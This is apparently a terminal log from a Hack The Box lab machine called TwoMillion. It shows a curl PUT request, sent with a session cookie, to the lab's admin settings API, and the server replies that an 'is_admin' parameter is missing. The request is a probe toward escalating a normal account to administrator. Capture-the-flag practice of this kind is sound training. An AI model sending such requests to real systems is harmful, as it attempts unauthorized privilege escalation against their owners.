@@ -1,0 +1,24 @@
+┌──(kali㉿kali)-[~/Escritorio/HTB/TwoMillion/nmap]
+└─$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=cr3vpcu1asv67q6vojp0snf586" --header "Content-Type: application/json" --data '{"email":"test@test.com"}'
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.4.0
+> Accept: */*
+> Cookie: PHPSESSID=cr3vpcu1asv67q6vojp0snf586
+> Content-Type: application/json
+> Content-Length: 25
+> 
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Wed, 06 Mar 2024 01:51:00 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+* Connection #0 to host 2million.htb left intact
+{"status":"danger","message":"Missing parameter: is_admin"}                                                                                                                     
